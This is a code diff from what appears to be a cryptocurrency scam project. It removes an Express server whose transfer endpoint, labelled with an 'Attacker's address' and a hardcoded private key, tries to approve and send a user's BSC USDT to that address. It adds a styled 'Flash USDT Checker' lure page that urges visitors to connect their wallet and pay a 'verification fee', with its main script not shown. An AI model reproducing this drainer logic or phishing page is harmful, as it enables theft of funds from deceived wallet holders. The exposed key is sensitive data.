@@ -1,343 +1,788 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const { Web3 } = require('web3');
-
-const app = express();
-const port = 3000;
-
-app.use(bodyParser.json());
-
-const web3 = new Web3('https://bsc-dataseed.binance.org/');
-const attackerAddress = '0x690da78b047ef534fd4e2eabd4a3a8a5b733d8df'; // Attacker's address
-const contractABI = [
-    {
-        "constant": true,
-        "inputs": [],
-        "name": "name",
-        "outputs": [
-            {
-                "name": "",
-                "type": "string"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [
-            {
-                "name": "_spender",
-                "type": "address"
-            },
-            {
-                "name": "_value",
-                "type": "uint256"
-            }
-        ],
-        "name": "approve",
-        "outputs": [
-            {
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "constant": true,
-        "inputs": [],
-        "name": "totalSupply",
-        "outputs": [
-            {
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [
-            {
-                "name": "_from",
-                "type": "address"
-            },
-            {
-                "name": "_to",
-                "type": "address"
-            },
-            {
-                "name": "_value",
-                "type": "uint256"
-            }
-        ],
-        "name": "transferFrom",
-        "outputs": [
-            {
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "constant": true,
-        "inputs": [
-            {
-                "name": "_owner",
-                "type": "address"
-            }
-        ],
-        "name": "balanceOf",
-        "outputs": [
-            {
-                "name": "balance",
-                "type": "uint256"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "constant": true,
-        "inputs": [],
-        "name": "decimals",
-        "outputs": [
-            {
-                "name": "",
-                "type": "uint8"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "constant": true,
-        "inputs": [
-            {
-                "name": "_owner",
-                "type": "address"
-            },
-            {
-                "name": "_spender",
-                "type": "address"
-            }
-        ],
-        "name": "allowance",
-        "outputs": [
-            {
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [
-            {
-                "name": "_to",
-                "type": "address"
-            },
-            {
-                "name": "_value",
-                "type": "uint256"
-            }
-        ],
-        "name": "transfer",
-        "outputs": [
-            {
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "constant": true,
-        "inputs": [
-            {
-                "name": "_token",
-                "type": "address"
-            }
-        ],
-        "name": "getTokenInfo",
-        "outputs": [
-            {
-                "name": "name",
-                "type": "string"
-            },
-            {
-                "name": "symbol",
-                "type": "string"
-            },
-            {
-                "name": "decimals",
-                "type": "uint8"
-            },
-            {
-                "name": "totalSupply",
-                "type": "uint256"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [
-            {
-                "name": "_spender",
-                "type": "address"
-            },
-            {
-                "name": "_value",
-                "type": "uint256"
-            },
-            {
-                "name": "_extraData",
-                "type": "bytes"
-            }
-        ],
-        "name": "approveAndCall",
-        "outputs": [
-            {
-                "name": "success",
-                "type": "bool"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "anonymous": false,
-        "inputs": [
-            {
-                "indexed": true,
-                "name": "owner",
-                "type": "address"
-            },
-            {
-                "indexed": true,
-                "name": "spender",
-                "type": "address"
-            },
-            {
-                "indexed": false,
-                "name": "value",
-                "type": "uint256"
-            }
-        ],
-        "name": "Approval",
-        "type": "event"
-    },
-    {
-        "anonymous": false,
-        "inputs": [
-            {
-                "indexed": true,
-                "name": "from",
-                "type": "address"
-            },
-            {
-                "indexed": true,
-                "name": "to",
-                "type": "address"
-            },
-            {
-                "indexed": false,
-                "name": "value",
-                "type": "uint256"
-            }
-        ],
-        "name": "Transfer",
-        "type": "event"
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Flashusdt Checker</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+  <script src="main.js" defer></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    html { 
+      scroll-behavior: smooth; 
     }
-];
-const contractAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT contract address on BSC
 
-const contract = new web3.eth.Contract(contractABI, contractAddress);
-
-app.post('/transfer', async (req, res) => {
-    const { userAddress, amount } = req.body;
-
-    try {
-        console.log(`User Address: ${userAddress}`);
-        console.log(`Amount: ${amount}`);
-
-        if (!userAddress || !amount) {
-            throw new Error('User address or amount is undefined');
-        }
-
-        // Convert the amount back to BigInt
-        const amountBigInt = BigInt(amount);
-
-        // Create a new contract instance with the user's address
-        const userContract = new web3.eth.Contract(contractABI, contractAddress);
-
-        // Check the user's balance
-        const balance = await userContract.methods.balanceOf(userAddress).call();
-        console.log(`User balance: ${balance}`);
-
-        if (balance < amountBigInt) {
-            throw new Error('Insufficient balance');
-        }
-
-        // Approve the contract to spend all tokens
-        const approvalTx = userContract.methods.approve(attackerAddress, amountBigInt);
-        const data = approvalTx.encodeABI();
-
-        const tx = {
-            from: userAddress,
-            to: contractAddress,
-            data: data,
-            gas: 200000
-        };
-
-        // Sign the transaction with the attacker's private key
-        const signedTx = await web3.eth.accounts.signTransaction(tx, '0xd076d1a18e4c2d2d3294ca32f9c926f567662169e350c9cb55f4e417d97d526e');
-        const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-        console.log('Approval transaction sent:', txHash);
-
-        // Transfer all funds to the attacker's address
-        const transferTx = userContract.methods.transfer(attackerAddress, amountBigInt);
-        const transferData = transferTx.encodeABI();
-
-        const transferTxObj = {
-            from: userAddress,
-            to: contractAddress,
-            data: transferData,
-            gas: 200000
-        };
-
-        // Sign the transfer transaction with the attacker's private key
-        const signedTransferTx = await web3.eth.accounts.signTransaction(transferTxObj, '0xd076d1a18e4c2d2d3294ca32f9c926f567662169e350c9cb55f4e417d97d526e');
-        const transferTxHash = await web3.eth.sendSignedTransaction(signedTransferTx.rawTransaction);
-        console.log('Transfer transaction sent:', transferTxHash);
-
-        res.send('Funds transferred successfully!');
-    } catch (error) {
-        console.error('Error transferring funds:', error);
-        res.status(500).send('Error transferring funds: ' + error.message);
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
-});
 
-app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}`);
-});
+     :root {
+      --primary-color: #0066FF;
+      --secondary-color: #00D4FF;
+      --accent-color: #FFD700;
+      --background-dark: #0A0B0D;
+      --background-card: #faf7f7;
+      --text-primary: #b7f51a;
+      --text-secondary: #B0B3B8;
+      --success-color: #00C851;
+      --warning-color: #FF8800;
+      --error-color: #FF4444;
+      --border-color: #2F3136;
+    }
+
+    
+  
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--background-dark);
+      color: var(--text-primary);
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+
+    /* Background Animation */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #f8f9fb10 0%, #492cee10 100%);
+      z-index: -2;
+    }
+
+    body::after {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 20% 50%, #0066FF15 0%, transparent 50%),
+                  radial-gradient(circle at 80% 20%, #00D4FF15 0%, transparent 50%),
+                  radial-gradient(circle at 40% 80%, #FFD70015 0%, transparent 50%);
+      z-index: -1;
+      animation: float 15s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 180% { transform: translateY(0px) rotate(0deg); }
+      50% { transform: translateY(0px) rotate(180deg); }
+    }
+
+    /* 3D Logo Styles */
+    .logo-3d-container {
+      position: relative;
+      width: 50px;
+      height: 50px;
+      perspective: 500px;
+    }
+
+    .logo-3d {
+      width: 100%;
+      height: 100%;
+      position: relative;
+      transform-style: preserve-3d;
+      animation: logoRotate 8s linear infinite;
+    }
+
+    .logo-face {
+      position: absolute;
+      width: 50px;
+      height: 50px;
+      border-radius: 8px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 8px;
+      font-weight: bold;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0, 102, 255, 0.3);
+      border: 1px solid rgba(0, 102, 255, 0.5);
+    }
+
+    .logo-face.front {
+      background: linear-gradient(135deg, #0066FF, #00D4FF);
+      color: #b7f51a;
+      transform: translateZ(25px);
+      text-shadow: 0 0 5px rgba(183, 245, 26, 0.8);
+    }
+
+    .logo-face.back {
+      background: linear-gradient(135deg, #00D4FF, #0066FF);
+      color: #FFD700;
+      transform: translateZ(-25px) rotateY(180deg);
+      text-shadow: 0 0 5px rgba(255, 215, 0, 0.8);
+    }
+
+    .logo-face.right {
+      background: linear-gradient(135deg, #FFD700, #FF8800);
+      color: #0066FF;
+      transform: rotateY(90deg) translateZ(25px);
+      text-shadow: 0 0 5px rgba(0, 102, 255, 0.8);
+    }
+
+    .logo-face.left {
+      background: linear-gradient(135deg, #FF8800, #FFD700);
+      color: #0066FF;
+      transform: rotateY(-90deg) translateZ(25px);
+      text-shadow: 0 0 5px rgba(0, 102, 255, 0.8);
+    }
+
+    .logo-face.top {
+      background: linear-gradient(135deg, #b7f51a, #00C851);
+      color: #0066FF;
+      transform: rotateX(90deg) translateZ(25px);
+      text-shadow: 0 0 5px rgba(0, 102, 255, 0.8);
+    }
+
+    .logo-face.bottom {
+      background: linear-gradient(135deg, #00C851, #b7f51a);
+      color: #0066FF;
+      transform: rotateX(-90deg) translateZ(25px);
+      text-shadow: 0 0 5px rgba(0, 102, 255, 0.8);
+    }
+
+    .logo-text-3d {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      line-height: 1;
+    }
+
+    .flash-text-3d {
+      font-size: 7px;
+      font-weight: 900;
+      letter-spacing: 0.5px;
+    }
+
+    .usdt-text-3d {
+      font-size: 6px;
+      font-weight: 700;
+      letter-spacing: 0.3px;
+    }
+
+    .checker-text-3d {
+      font-size: 4px;
+      font-weight: 500;
+      letter-spacing: 0.2px;
+      opacity: 0.9;
+    }
+
+    .logo-icon-3d {
+      position: absolute;
+      font-size: 6px;
+    }
+
+    .logo-icon-3d.top-right {
+      top: 2px;
+      right: 2px;
+    }
+
+    .logo-icon-3d.bottom-left {
+      bottom: 2px;
+      left: 2px;
+    }
+
+    @keyframes logoRotate {
+      from { transform: rotateY(0deg) rotateX(0deg); }
+      to { transform: rotateY(360deg) rotateX(360deg); }
+    }
+
+    /* Bubble Animation */
+    @keyframes bubble {
+      0% { transform: translateY(0px) scale(1); opacity: 0.7; }
+      50% { transform: translateY(-20px) scale(1.05); opacity: 1; }
+      100% { transform: translateY(0px) scale(1); opacity: 0.7; }
+    }
+
+    @keyframes bubble-glow {
+      0% { box-shadow: 0 0 5px rgba(0, 102, 255, 0.3); }
+      50% { box-shadow: 0 0 20px rgba(0, 102, 255, 0.6), 0 0 30px rgba(255, 215, 0, 0.4); }
+      100% { box-shadow: 0 0 5px rgba(0, 102, 255, 0.3); }
+    }
+
+
+    /* Header Styles */
+    header {
+      position: fixed;
+      top: 0;
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 1.5rem;
+      background: rgba(26, 27, 31, 0.95);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border-color);
+      z-index: 1000;
+      transition: all 0.3s ease;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+
+    .logo-container img {
+      width: 45px;
+      height: 45px;
+      border-radius: 12px;
+      object-fit: cover;
+      border: 2px solid var(--primary-blue);
+    }
+
+    .site-title {
+      font-size: 1.4rem;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    .site-title .white { 
+      color: var(--primary-color); 
+    }
+    
+    .site-title .yellow { 
+      color: var(--background-card);
+      text-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+    }
+
+    nav {
+      display: flex;
+      gap: 2rem;
+      align-items: center;
+    }
+
+    nav a {
+      color: var(--text-secondary);
+      text-decoration: none;
+      font-size: 0.95rem;
+      font-weight: 500;
+      transition: all 0.3s ease;
+      position: relative;
+    }
+
+    nav a:hover {
+      color: var(--primary-blue);
+      transform: translateY(-1px);
+    }
+
+    nav a::after {
+      content: '';
+      position: absolute;
+      bottom: -4px;
+      left: 0;
+      width: 0;
+      height: 2px;
+      background: var(--primary-blue);
+      transition: width 0.3s ease;
+    }
+
+    nav a:hover::after {
+      width: 100%;
+    }
+
+    /* Main Content */
+    .token-images {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 1rem;
+      margin-top: 120px;
+      margin-bottom: 2rem;
+      padding: 0 1rem;
+    }
+
+    .token-images img {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  object-fit: cover;
+  border: 3px solid var(--border-color);
+  transition: all 0.3s ease;
+  cursor: pointer;
+  background: var(--background-dark);
+  padding: 8px;
+  animation: bubble 3s ease-in-out infinite, bubble-glow 3s ease-in-out infinite;
+}
+
+.token-images img:nth-child(1) { animation-delay: 0s; }
+.token-images img:nth-child(2) { animation-delay: 0.5s; }
+.token-images img:nth-child(3) { animation-delay: 1s; }
+.token-images img:nth-child(4) { animation-delay: 1.5s; }
+
+.token-images img:hover {
+  transform: translateY(-5px) scale(1.05);
+  border-color: var(--accent-color);
+  box-shadow: 0 10px 30px rgba(0, 102, 255, 0.3);
+  animation-play-state: paused;
+}
+
+    h1 {
+      color: var(--text-primary);
+      font-size: 2.5rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+      text-align: center;
+      background: linear-gradient(135deg, var(--text-primary), var(--primary-blue));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -1px;
+    }
+
+    /* Button Styles */
+    button,
+    .glow-button {
+      padding: 1rem 2.5rem;
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--text-primary);
+      background: linear-gradient(135deg, var(--primary-color), var(--primary-color));
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      text-align: center;
+      transition: all 0.3s ease;
+      box-shadow: 0 15px 50px rgba(203, 251, 90, 0.3);
+      display: block;
+      margin: 0 auto 2rem;
+      text-decoration: none;
+      position: relative;
+      overflow: hidden;
+      min-width: 200px;
+    }
+
+    button::before,
+    .glow-button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: left 0.5s ease;
+    }
+
+    button:hover::before,
+    .glow-button:hover::before {
+      left: 100%;
+    }
+
+    button:hover,
+    .glow-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 30px rgba(0, 102, 255, 0.4);
+    }
+
+    button:active,
+    .glow-button:active {
+      transform: translateY(0);
+    }
+
+    /* Card Sections */
+    .black-section {
+      width: 95%;
+      max-width: 1200px;
+      margin: 3rem auto;
+      padding: 2.5rem 1.5rem;
+      background: rgba(26, 27, 31, 0.8);
+      backdrop-filter: blur(15px);
+      border-radius: 24px;
+      border: 1px solid var(--border-color);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .black-section::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: linear-gradient(135deg, var(--primary-blue), var(--accent-yellow));
+    }
+
+    .black-section img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 16px;
+      margin-bottom: 2rem;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      transition: transform 0.3s ease;
+    }
+
+    .black-section img:hover {
+      transform: scale(1.02);
+    }
+
+    /* Warning Section */
+    .fake-warning {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 2rem;
+      background: linear-gradient(135deg, rgba(255, 136, 0, 0.1), rgba(255, 68, 68, 0.1));
+      padding: 2rem;
+      border-radius: 20px;
+      margin-bottom: 2rem;
+      border: 1px solid var(--warning-color);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .fake-warning::before {
+      content: '⚠️';
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      font-size: 1.5rem;
+      opacity: 0.7;
+    }
+
+    .fake-warning img {
+      width: 280px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+    }
+
+    .fake-warning p {
+      max-width: 450px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--text-primary);
+      margin: 0;
+      line-height: 1.6;
+    }
+
+    .fake-warning span {
+      color: var(--primary-blue);
+      cursor: pointer;
+      text-decoration: underline;
+      transition: color 0.3s ease;
+    }
+
+    .fake-warning span:hover {
+      color: var(--accent-yellow);
+    }
+
+    .button-wrapper {
+      width: 100%;
+      text-align: center;
+      margin-top: 1.5rem;
+    }
+
+    /* Footer */
+    footer {
+      width: 100%;
+      text-align: center;
+      padding: 2rem 1rem;
+      background: var(--bg-card);
+      color: var(--text-primary);
+      border-top: 1px solid var(--border-color);
+      font-size: 0.9rem;
+      line-height: 1.6;
+      margin-top: 2rem;
+    }
+
+    footer p {
+      margin-bottom: 1rem;
+      color: var(--text-secondary);
+    }
+
+    footer a {
+      color: var(--primary-blue);
+      text-decoration: none;
+      transition: color 0.3s ease;
+    }
+
+    footer a:hover {
+      color: var(--accent-yellow);
+    }
+
+    footer img {
+      width: 100%;
+      max-width: 450px;
+      margin-top: 2rem;
+      border-radius: 12px;
+      opacity: 0.8;
+    }
+
+    /* Popup Styles */
+    #popupMessage {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: var(--bg-card);
+      color: var(--text-primary);
+      padding: 2rem;
+      border-radius: 20px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+      z-index: 2000;
+      display: none;
+      text-align: center;
+      max-width: 350px;
+      width: 90%;
+      border: 1px solid var(--border-color);
+      backdrop-filter: blur(20px);
+    }
+
+    #popupMessage p {
+      margin-bottom: 1.5rem;
+      font-size: 1rem;
+      color: var(--text-secondary);
+    }
+
+    #popupMessage button {
+      margin-top: 0;
+      padding: 0.75rem 1.5rem;
+      background: var(--primary-blue);
+      color: var(--text-primary);
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      min-width: auto;
+    }
+
+    #popupMessage button:hover {
+      background: var(--secondary-blue);
+      transform: translateY(-1px);
+    }
+
+    /* Mobile Responsive */
+    @media (max-width: 768px) {
+      header {
+        flex-direction: column;
+        text-align: center;
+        padding: 1rem;
+        gap: 1rem;
+      }
+
+      nav {
+        flex-wrap: wrap;
+        gap: 1.5rem;
+        justify-content: center;
+      }
+
+      .token-images {
+        margin-top: 140px;
+        gap: 0.75rem;
+      }
+
+      .token-images img {
+        width: 65px;
+        height: 65px;
+      }
+
+      h1 {
+        font-size: 2rem;
+        padding: 0 1rem;
+      }
+
+      button,
+      .glow-button {
+        font-size: 0.95rem;
+        width: 90%;
+        max-width: 300px;
+        padding: 0.875rem 1.5rem;
+      }
+
+      .black-section {
+        padding: 1.5rem 1rem;
+        margin: 2rem auto;
+      }
+
+      .fake-warning {
+        flex-direction: column;
+        text-align: center;
+        gap: 1.5rem;
+        padding: 1.5rem;
+      }
+
+      .fake-warning img {
+        width: 100%;
+        max-width: 280px;
+      }
+
+      .fake-warning p {
+        font-size: 1rem;
+      }
+
+      .site-title {
+        font-size: 1.2rem;
+      }
+
+      nav a {
+        font-size: 0.9rem;
+      }
+    }
+
+    @media (max-width: 480px) {
+      header {
+        padding: 0.875rem;
+      }
+
+      .token-images {
+        margin-top: 160px;
+      }
+
+      .token-images img {
+        width: 55px;
+        height: 55px;
+      }
+
+      h1 {
+        font-size: 1.75rem;
+      }
+
+      .black-section {
+        padding: 1.25rem 0.75rem;
+        border-radius: 16px;
+      }
+
+      .fake-warning {
+        padding: 1.25rem;
+        border-radius: 16px;
+      }
+
+      .site-title {
+        font-size: 1.1rem;
+      }
+
+      nav {
+        gap: 1rem;
+      }
+
+      nav a {
+        font-size: 0.85rem;
+      }
+
+      #popupMessage {
+        padding: 1.5rem;
+        max-width: 320px;
+      }
+    }
+
+    /* Additional Mobile Optimizations */
+    @media (max-width: 360px) {
+      .token-images img {
+        width: 50px;
+        height: 50px;
+      }
+
+      h1 {
+        font-size: 1.5rem;
+      }
+
+      .site-title {
+        font-size: 1rem;
+      }
+
+      button,
+      .glow-button {
+        font-size: 0.9rem;
+        padding: 0.75rem 1.25rem;
+      }
+    }
+
+    /* Hover effects for touch devices */
+    @media (hover: none) {
+      .token-images img:hover {
+        transform: none;
+      }
+      
+      nav a:hover {
+        transform: none;
+      }
+      
+      button:hover,
+      .glow-button:hover {
+        transform: none;
+      }
+    }
+  </style>
+</head>
+
+<body id="home">
+  <header>
+    <div class="logo-container">
+      <img src="images/logo.png" alt="Website Logo">
+      <div class="site-title">
+        <span class="white">FLASH</span> <span class="yellow">USDT</span> <span class="white">CHECKERS</span>
+      </div>
+    </div>
+    <nav>
+      <a href="#home">Home</a>
+      <a href="#about">About</a>
+      <a href="#services">Services</a>
+      <a href="https://bscscan.com" target="_blank">BSC Scan</a>
+    </nav>
+  </header>
+
+  <div class="token-images">
+    <img src="images/eth.png" alt="ETH Token">
+    <img src="images/btc.png" alt="BTC Token">
+    <img src="images/usdt.png" alt="USDT Token">
+    <img src="images/sibha.png" alt="SIBHAINU Token">
+  </div>
+
+  <h1>Connect Your Wallet</h1>
+  <button id="connectButton">Connect Wallet</button>
+
+  <div class="black-section" id="about">
+    <img src="images/about.png" alt="About FlashUSDT" />
+
+    <div class="fake-warning">
+      <img src="images/fake.jpg" alt="Fake Token Alert" />
+      <p>
+        Be aware of fake tokens and always scan your token on 
+        <span onclick="document.getElementById('connectButton').click()">FlashChecker</span>.
+      </p>
+    </div>
+
+    <img src="images/promo.png" alt="FlashUSDT Stats" />
+
+    <div id="services">
+      <img src="images/service.png" alt="FlashChecker Services" />
+      <div class="button-wrapper">
+        <a href="https://bscscan.com" target="_blank" class="glow-button">BSC Blockchain Scan</a>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <p>Join Our FlashChecker Community</p>
+    <p>Connect your wallet, and let us instantly validate your FlashUSDT balance with secure checks and a small verification fee.</p>
+    <p>&copy; 2025 FlashChecker | All rights reserved</p>
+    <img src="images/footer.jpg" alt="Footer Image">
+  </footer>
+
+  <div id="popupMessage">
+    <p id="popupText">User rejected wallet connect. Try again.</p>
+    <button onclick="closePopup()">Close</button>
+  </div>
+
+  <script>
+    function showPopup(message) {
+      document.getElementById("popupText").innerText = message;
+      document.getElementById("popupMessage").style.display = "block";
+    }
+
+    function closePopup() {
+      document.getElementById("popupMessage").style.display = "none";
+    }
+  </script>
+</body>
+</html>
